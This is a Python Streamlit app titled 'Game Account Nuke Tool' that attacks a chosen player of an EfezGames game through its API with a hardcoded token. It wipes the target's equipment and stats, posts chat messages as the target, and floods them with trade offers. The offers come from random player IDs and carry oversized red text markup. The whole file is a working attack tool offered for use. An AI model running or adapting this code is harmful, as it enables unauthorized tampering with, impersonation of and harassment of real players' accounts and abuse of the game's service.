import streamlit as st
import requests
import random
from concurrent.futures import ThreadPoolExecutor
import time

PRICESHASH = "fbd9aec4384456124c0765581a4ba099"

# Global headers for all requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json'
}

# Headers for form data (POST requests)
FORM_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded'
}

if 'is_running' not in st.session_state:
    st.session_state.is_running = False
if 'stop_flag' not in st.session_state:
    st.session_state.stop_flag = False

def load_ids():
    try:
        with open("Allids.txt", "r") as file:
            ids = []
            for line in file:
                line = line.strip()
                if line and not line.startswith('Player IDs') and not line.startswith('✓') and not line.startswith('Sent'):
                    ids.append(line)
        return ids
    except FileNotFoundError:
        st.error("Allids.txt file not found!")
        return []

def send_message(id, text, channel):
    try:
        req = "https://api.efezgames.com/v1/social/sendChat?playerID={ID}&token={token}&message={msg}&chan={chan}"
        request = req.format(ID=id, token="01122", msg=text, chan=channel)
        response = requests.get(request, headers=HEADERS, timeout=10)
        return response.json()
    except Exception as e:
        return None

def clear_acc(target_id):
    try:
        req = "https://api.efezgames.com/v1/equipment/sendEQ"
        myobj = {
            "playerID": target_id,
            "version": "hui",
            "data": "0;0;0;0;0;0;0;0;0;0;0",
            "eqdata": "0"*32,
            "stats": "1:0,2:0,3:0,4:0,5:0,6:0.00,7:0.00,8:0,9:0,11:0,13:0,15:0.00,16:0.00,17:0.00,18:0,19:0,20:0,23:0,24:0,25:0,27:0,28:0,30:0,31:0,33:0,34:0,36:0,38:0,39:0,40:0,41:0,42:0",
            "blockedUsers": target_id,
            "description": "<color=red><size=100>rip",
            "token": "01122",
        }
        response = requests.post(url=req, data=myobj, headers=FORM_HEADERS, timeout=10)
        return response.text
    except Exception as e:
        return None

def create_trade(sender_id, receiver_id, message_text, message_index):
    try:
        msg = "<size=100><voffset=100><pos=0><color=red>" + message_text[message_index]
        
        skin = "HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00"
        
        req = "https://api.efezgames.com/v1/trades/createOffer?token={TOKEN}&playerID={PLAYERID}&receiverID={RECEIVERID}&senderNick={SENDERNICK}&senderFrame={SENDERFRAME}&senderAvatar={SENDERAVATAR}&receiverNick={RECEIVERNICK}&receiverFrame={RECEIVERFRAME}&receiverAvatar={RECEIVERAVATAR}&skinsOffered={SKINSOFFERED}&skinsRequested={SKINSREQUESTED}&message={MESSAGE}&pricesHash={PRICESHASH}&senderOneSignal=a27b79ec-f206-4022-b12f-260855743091&receiverOneSignal=1621a4af-03a2-4fcf-976c-d68c021460c8&senderVersion=2.31.0&receiverVersion=2.31.0"
        
        request = req.format(TOKEN="01122",
                             PLAYERID=sender_id,
                             RECEIVERID=receiver_id,
                             SENDERNICK="NukeBot",
                             SENDERFRAME="lP",
                             SENDERAVATAR="yB",
                             RECEIVERNICK="YOU",
                             RECEIVERFRAME="aa",
                             RECEIVERAVATAR="aa",
                             SKINSOFFERED=skin,
                             SKINSREQUESTED=skin,
                             PRICESHASH=PRICESHASH,
                             MESSAGE=msg)
        response = requests.get(request, headers=HEADERS, timeout=10)
        return response.json()
    except Exception:
        return {"success": False}

def run_nuke(target_id, trades_count, channel, progress_bar, status_text):
    st.session_state.is_running = True
    st.session_state.stop_flag = False
    
    ids = load_ids()
    if not ids:
        st.session_state.is_running = False
        return
    
    status_text.text(f"Loaded {len(ids)} IDs")
    progress_bar.progress(0)
    
    send_message(target_id, "Bamboozle", channel)
    clear_acc(target_id)
    
    successful_trades = 0
    total_attempts = trades_count
    
    for batch in range(trades_count):
        if st.session_state.stop_flag:
            status_text.text("Stopped by user")
            break
            
        progress = (batch + 1) / trades_count
        progress_bar.progress(progress)
        status_text.text(f"Batch {batch + 1}/{trades_count} - Success: {successful_trades}")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for j in range(10):
                random_id = random.choice(ids)
                futures.append(executor.submit(create_trade, random_id, target_id, ["rip"] * 10, 0))
            
            for future in futures:
                try:
                    response = future.result(timeout=15)
                    if response.get("success", False):
                        successful_trades += 1
                except Exception:
                    pass
        
        time.sleep(0.5)
    
    clear_acc(target_id)
    send_message(target_id, "rip", channel)
    
    status_text.text(f"Completed! {successful_trades} successful trades")
    progress_bar.progress(1.0)
    st.session_state.is_running = False

st.set_page_config(page_title="Portable Nuke", page_icon="💣", layout="wide")

st.title("Game Account Nuke Tool")
st.markdown("---")


col1, col2 = st.columns(2)

with col1:
    target_id = st.text_input("🎯 Target Player ID", placeholder="Enter player ID...")
    trades_batches = st.number_input("📊 Trade Batches", min_value=1, max_value=100, value=10)

with col2:
    channel = st.selectbox("📢 Channel", ["US", "EU", "ASIA"], index=0)
    total_trades = trades_batches * 10
    st.info(f"**Total trades:** {total_trades}")

st.markdown("---")

status_text = st.empty()
progress_bar = st.progress(0)

col1, col2 = st.columns(2)

with col1:
    start_button = st.button("🚀 Start Nuke", type="primary", disabled=st.session_state.is_running)

with col2:
    stop_button = st.button("🛑 Stop Nuke", disabled=not st.session_state.is_running)

if start_button:
    if not target_id:
        st.error("Please enter a target player ID!")
    else:
        try:
            run_nuke(target_id, trades_batches, channel, progress_bar, status_text)
            st.success("Nuke completed!")
        except Exception as e:
            st.error(f"Error: {e}")
            st.session_state.is_running = False

if stop_button:
    st.session_state.stop_flag = True
    st.warning("Stopping...")

st.markdown("---")
st.markdown("*Made for Discord.gg/CaseOpener - advantex. - 06/06/26")
